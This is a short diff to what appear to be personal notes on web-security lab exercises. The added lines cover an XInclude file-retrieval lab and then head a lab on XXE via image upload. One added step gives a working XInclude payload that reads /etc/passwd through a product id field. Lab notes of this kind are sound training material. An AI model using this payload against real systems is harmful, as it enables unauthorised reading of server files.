@@ -54,3 +54,6 @@
 #7 Lab:  Exploiting XInclude to retrieve files
 
      1. Check stock and send the request to repeater.
+     2. In product id replace id of product with <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo> 
+
+#8 Lab: Exploiting XXE via image file upload
